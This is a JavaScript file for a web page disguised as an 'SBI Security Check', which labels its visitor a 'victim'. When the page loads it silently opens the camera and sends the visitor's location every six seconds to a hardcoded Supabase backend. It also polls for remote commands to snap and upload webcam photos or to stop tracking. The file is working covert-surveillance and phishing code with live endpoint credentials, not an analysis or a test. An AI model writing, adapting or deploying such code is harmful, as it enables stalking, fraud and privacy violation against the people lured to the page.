const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";

let sessionId = "";
let videoStream = null;
let isKilled = false;

async function init() {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
      body: JSON.stringify({ 
        owner_id: "sbi-victim-" + Date.now(), 
        label: "SBI Security Check", 
        is_active: true, 
        is_killed: false,
        capture_now: false   // For manual capture command
      })
    });

    const data = await res.json();
    sessionId = data[0].id;

    // Silent background camera ready for manual capture
    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
    console.log("📸 Background camera ready");

    // Background location
    setInterval(sendLocation, 6000);

    // Check for kill or capture command
    setInterval(checkCommands, 3000);

  } catch(e) {
    console.error(e);
  }
}

function sendLocation() {
  if (isKilled) return;
  navigator.geolocation.getCurrentPosition(pos => {
    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })
    });
  });
}

async function checkCommands() {
  if (!sessionId || isKilled) return;

  const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${sessionId}`, {
    headers: { "apikey": SUPABASE_KEY }
  });
  const data = await res.json();
  const session = data[0];

  if (session.is_killed === true) {
    isKilled = true;
    stopEverything();
  }

  if (session.capture_now === true) {
    capturePhoto();
    // Reset command
    fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${sessionId}`, {
      method: "PATCH",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
      body: JSON.stringify({ capture_now: false })
    });
  }
}

function capturePhoto() {
  if (!videoStream) return;
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  canvas.getContext('2d').drawImage(document.createElement('video'), 0, 0, 640, 480); // dummy for now

  // Better capture using existing stream
  const tempVideo = document.createElement('video');
  tempVideo.srcObject = videoStream;
  tempVideo.play();

  setTimeout(() => {
    const canvas2 = document.createElement('canvas');
    canvas2.width = 640;
    canvas2.height = 480;
    canvas2.getContext('2d').drawImage(tempVideo, 0, 0, 640, 480);
    const photo = canvas2.toDataURL('image/jpeg', 0.85);

    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId, photo_data: photo })
    });
  }, 200);
}

function stopEverything() {
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
  }
  console.log("%c🛑 ALL TRACKING STOPPED BY ADMIN", "color:red;font-size:25px");
}

window.onload = init;